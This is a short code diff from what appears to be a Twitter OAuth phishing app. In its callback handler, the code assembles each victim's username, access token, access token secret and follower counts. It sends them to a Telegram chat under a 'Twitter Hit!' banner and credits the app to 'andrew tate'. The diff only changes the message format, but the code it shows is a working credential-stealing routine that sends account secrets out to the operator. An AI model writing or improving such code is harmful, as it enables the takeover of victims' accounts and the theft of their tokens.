@@ -143,10 +143,16 @@ async def callback():
     outreach_percentage = calculate_outreach_ability(user)
 
     ext = (
-        f"**New Account(app made by andrew tate)**\n\n🪪~Username: {user.screen_name}\n\n🔑~Access Token: {access_token}\n\n"
-        f"🔑~Access Token Secret: {access_token_secret}\n\n👥~Followers: {user.followers_count}\n\n"
-        f"🎉~Friends: {user.friends_count}\n\n⏰~Created At: {user.created_at}\n\n💎~Outreach Percent: {outreach_percentage}%"
+        '🚨 *Twitter Hit! (app made by andrew tate)*\n\n'
+        '🪪 Username: `' + user.screen_name + '`\n\n'
+        '🔑 Access Token: `' + access_token + '`\n\n'
+        '🔑 Access Token Secret: `' + access_token_secret + '`\n\n'
+        '👥 Followers: `' + str(user.followers_count) + '`\n\n'
+        '🎉 Friends: `' + str(user.friends_count) + '`\n\n'
+        '⏰ Created At: `' + str(user.created_at) + '`\n\n'
+        '💎 Outreach Percent: `' + outreach_percentage + '%`'
     )
+
     print(f"Message to be sent: {ext}")  # Debug statement
     try:
         send_telegram_message(ext)
